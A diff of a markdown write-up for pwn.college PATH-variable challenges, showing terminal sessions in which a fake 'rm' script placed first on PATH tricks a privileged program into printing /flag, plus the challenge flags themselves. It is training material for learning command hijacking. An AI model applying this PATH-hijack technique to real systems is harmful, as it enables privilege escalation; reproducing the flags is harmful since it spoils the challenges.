@@ -63,7 +63,7 @@ The flag : `pwn.college{wxicxqMKVCx8td6j7j-eYd9XJPx.dVzNyUDLzQjN0czW}`
 
 In this challenge, we need to trick `/challenge/run` into printing the flag by modifying the `win` file. 
 
-I used [nano](https://www.nano-editor.org/) to create a file named `win` in the home directory:
+I used [nano](https://www.nano-editor.org/) to create a file named `win` in the home directory and added the commands.
 
 > [!NOTE]
 > Since we are modifying the `PATH` variable, the system can't find comamnds like `cat`. Therefore we have to use alternative methods to print out the flag.
@@ -75,4 +75,55 @@ I made it executabe for all users by running **`chmod o+x win`**
 
 Then I modify the PATH variable - `PATH=~/`
 
-Finally I run **`/challenge/run`** to get the flag -
+Finally I run **`/challenge/run`** to get the flag.
+
+```
+Connected!
+hacker@path~adding-commands:~$ nano win
+hacker@path~adding-commands:~$ chmod u+x win
+hacker@path~adding-commands:~$ PATH=~/
+hacker@path~adding-commands:~$ /challenge/run
+Invoking 'win'....
+pwn.college{YVVrN_1ml0uGiAQ2ODsITTlLdaM.dZzNyUDLzQjN0czW}
+hacker@path~adding-commands:~$
+```
+The flag : `pwn.college{YVVrN_1ml0uGiAQ2ODsITTlLdaM.dZzNyUDLzQjN0czW}`
+
+
+
+## Hijacking Commands
+
+In this challenge, we need to trick `/challenge/run` into printing the flag by changing the `rm` comamnd.
+
+> [!NOTE]
+> To get the flag, we could create a file named rm that would display the flag. Subsequently, we could manipulate the PATH environment variable to prioritize our custom rm command, thereby deceiving /challenge/run into executing it and revealing the flag.
+
+I used [nano](https://www.nano-editor.org/) to create a file named `rm` in the home directory:
+
+```
+read FLAG < /flag
+echo $FLAG
+```
+I made it executabe for all users by running **`chmod o+x rm`**
+
+Then I modify the PATH variable - `PATH=~/`
+
+Finally I run `/challenge/run` to get the flag.
+
+The flag : `pwn.college{8tcAuRDf722huAyNiyiBlkAfEgB.ddzNyUDLzQjN0czW}`
+
+```
+
+Connected!
+hacker@path~hijacking-commands:~$ nano rm
+hacker@path~hijacking-commands:~$ chmod o+x rm
+hacker@path~hijacking-commands:~$ PATH=~/
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+pwn.college{8tcAuRDf722huAyNiyiBlkAfEgB.ddzNyUDLzQjN0czW}
+hacker@path~hijacking-commands:~$
+
+```
+# END
+
+
